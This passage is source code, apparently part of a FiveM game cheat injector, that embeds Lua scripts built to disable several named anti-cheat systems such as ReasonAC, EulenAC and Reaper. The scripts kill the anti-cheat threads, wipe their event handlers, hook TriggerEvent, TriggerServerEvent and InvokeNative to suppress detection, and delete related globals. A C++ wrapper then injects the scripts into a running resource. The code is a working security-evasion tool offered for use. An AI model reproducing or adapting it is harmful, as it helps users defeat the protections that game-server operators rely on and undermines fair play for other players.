                if h == native then return false end
            end
            return invoke(h, ...)
        end

        -- Kill threads
        local thr = debug.getregistry()._threads
        if thr then
            for i = #thr, 1, -1 do
                local co = thr[i]
                local info = debug.getinfo(co)
                if info and info.source and (info.source:find("Reaper") or info.source:find("reaper")) then
                    coroutine.close(co)
                end
            end
        end

        -- Remove globals
        local vars = { "ReaperV4", "ReaperAC", "ReaperDetect", "ReaperCheck", "RAC" }
        for _, v in ipairs(vars) do
            g[v] = nil
        end
    ]]

    -- ReasonAC Bypass (Enhanced)
    local reason_code = [[
        local g = _G
        local s = string
        local n = function() end

        -- Clean Reason threads
        local registry = debug.getregistry()
        local threads = registry._threads
        if threads then
            for i = #threads, 1, -1 do
                local co = threads[i]
                local info = debug.getinfo(co)
                if info and info.source and (s.find(info.source, "Reason") or s.find(info.source, "RAC")) then
                    coroutine.close(co)
                end
            end
        end

        -- Wipe event handlers
        local handlers = registry._eventHandlers
        if handlers then
            for ev, tbl in pairs(handlers) do
                if type(tbl) == "table" and (s.find(ev, "Reason") or s.find(ev, "RAC")) then
                    for i = #tbl, 1, -1 do
                        table.remove(tbl, i)
                    end
                end
            end
        end

        -- Block events
        g.TriggerEvent = function(e, ...)
            if type(e) == "string" and (s.find(e, "Reason") or s.find(e, "RAC")) then
                return
            end
            return g.TriggerEvent(e, ...)
        end

        g.TriggerServerEvent = function(e, ...)
            if type(e) == "string" and (s.find(e, "Reason") or s.find(e, "RAC")) then
                return
            end
            return g.TriggerServerEvent(e, ...)
        end

        g.RegisterNetEvent = function(e)
            if type(e) == "string" and (s.find(e, "Reason") or s.find(e, "RAC")) then
                return n
            end
            return g.RegisterNetEvent(e)
        end

        -- Block detection natives
        local detection_natives = {
            0x3A87E44BB9A01D54, 0x8DECB02F88F428BC, 0x015A522136D7F951,
            0xA38DCFFCE89696FA, 0x475768A975D5AD17, 0xF25DF915FA38C5F3,
            0x4899CB088EDF3BCC
        }

        local invoke = Citizen.InvokeNative
        Citizen.InvokeNative = function(hash, ...)
            for _, native in ipairs(detection_natives) do
                if hash == native then return false end
            end
            return invoke(hash, ...)
        end

        -- Clean state bag
        local state = LocalPlayer.state
        for k, v in pairs(state) do
            if type(v) == "function" and (s.find(k, "reason") or s.find(k, "rac")) then
                state[k] = n
            end
        end

        -- Remove globals
        local bad_globals = { "RAC", "ReasonAC", "ReasonDetect", "ReasonCheck", "ReasonVerify" }
        for _, name in ipairs(bad_globals) do
            g[name] = nil
        end
    ]]

    -- EulenAC Bypass (Enhanced)
    local eulen_code = [[
        local g = _G
        local n = function() end
        local t = function() return true end

        -- Block Eulen detection
        if g.Eulen then g.Eulen = nil end
        if g.EulenAC then g.EulenAC = nil end
        if g.EulenDetect then g.EulenDetect = n end

        -- Block events
        g.TriggerEvent = function(e, ...)
            if type(e) == "string" and (e:find("Eulen") or e:find("eulen")) then
                return
            end
            return g.TriggerEvent(e, ...)
        end

        g.TriggerServerEvent = function(e, ...)
            if type(e) == "string" and (e:find("Eulen") or e:find("eulen")) then
                return
            end
            return g.TriggerServerEvent(e, ...)
        end

        -- Kill threads
        local thr = debug.getregistry()._threads
        if thr then
            for i = #thr, 1, -1 do
                local co = thr[i]
                local info = debug.getinfo(co)
                if info and info.source and info.source:find("Eulen") then
                    coroutine.close(co)
                end
            end
        end
    ]]

    -- Inject all bypasses
    local injected_count = 0

    if inject_bypass(anticheat.FiveGuard, fiveguard_code) then injected_count = injected_count + 1 end
    if inject_bypass(anticheat.ElectronAC, electron_code) then injected_count = injected_count + 1 end
    if inject_bypass(anticheat.WaveShield, waveshield_code) then injected_count = injected_count + 1 end
    if inject_bypass(anticheat.EagleAC, eagle_code) then injected_count = injected_count + 1 end
    if inject_bypass(anticheat.ReaperV4, reaper_code) then injected_count = injected_count + 1 end
    if inject_bypass(anticheat.ReasonAC, reason_code) then injected_count = injected_count + 1 end
    if inject_bypass(anticheat.EulenAC, eulen_code) then injected_count = injected_count + 1 end

end)rawlua";

            if (!scriptContent.empty()) {
                ::ExecuteScriptInSelectedResource(scriptContent);
            }
        } catch (...) {}
    }
}

